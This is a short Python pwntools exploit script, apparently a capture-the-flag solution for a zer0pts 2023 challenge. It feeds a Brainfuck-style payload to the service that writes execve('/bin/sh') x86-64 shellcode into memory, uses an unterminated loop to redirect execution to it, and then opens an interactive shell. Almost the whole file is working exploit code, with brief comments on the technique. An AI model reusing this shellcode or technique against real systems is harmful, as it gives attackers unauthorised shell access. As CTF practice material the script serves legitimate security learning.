from pwn import *


if args.REMOTE:
  p = remote('pwn.2023.zer0pts.com', 9004)
else:
  p = remote('127.0.0.1', 9999)


# execve('/bin/sh',0,0) shellcode
shellc = b'\x31\xf6\xf7\xe6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# write shellcode in data mem
payload = b'.'*0x700
for c in shellc:
  for i in range(c):
    payload += b'+'
  payload += b'>'

# unterminated loop, will alter 0xff in
'''pwn disasm -c 'amd64' ff4981e80000000000
   0:    ff 49 81                 dec    DWORD PTR [rcx-0x7f]
   3:    e8 00 00 00 00           call   0x8'''
# we set jump to shellcode
payload += b'.['+b'<'*0xe2a

p.sendlineafter(': ', payload)

p.interactive()

